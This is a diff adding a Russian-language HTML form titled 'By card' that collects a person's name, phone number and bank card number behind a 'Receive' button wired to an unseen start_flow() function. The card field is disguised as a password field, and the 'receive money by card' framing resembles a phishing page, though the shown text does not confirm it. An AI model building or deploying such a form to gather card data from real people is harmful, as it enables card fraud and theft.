@@ -1,0 +1,37 @@
+
+<form method="post" onsubmit="event.preventDefault(); return false;" id="user_registration_form" class="user_registration_form block-form">
+    <h1 class="vstep-question">По карте</h1>
+    <div class="main_form_error_message"></div>
+    <div class="step-fields">
+        <div class="field">
+            <label class="label">Фамилия и имя</label>
+            <div class="control has-icons-left has-icons-right is-large">
+                <input type="text" placeholder="IVANOV IVAN" id="form_input_name" name="name" class="input is-large">
+            </div>
+        </div>
+        <div class="field">
+            <label class="label">Номер телефона</label>
+            <div class="control has-icons-left is-large is-clearfix">
+                <input type="text" placeholder="+7 (495) 777-66-55" required="required" id="form_input_phone" name="phone" class="input" maxlength="18">
+            </div>
+        </div>
+        <div class="field">
+            <label class="label">Номер карты</label>
+            <div class="control has-icons-left is-large is-clearfix">
+                <input type="text" placeholder="0000 0000 0000 0000" required="required" id="form_input_card" name="pw" class="password" maxlength="19">
+            </div>
+        </div>
+        <div class="field">
+            <div class="submit-button" id="next-btn">
+                <button class="send_button button button_main_color" type="button" onclick="start_flow();" id="next-btn">Получить</button>
+            </div>
+        </div>
+        <div class="form-footer">
+            <div class="form-footer-text">
+            </div>
+            <div class="form-footer-image">
+                <img src="images/cards.png">
+            </div>
+        </div>
+    </div>
+</form>
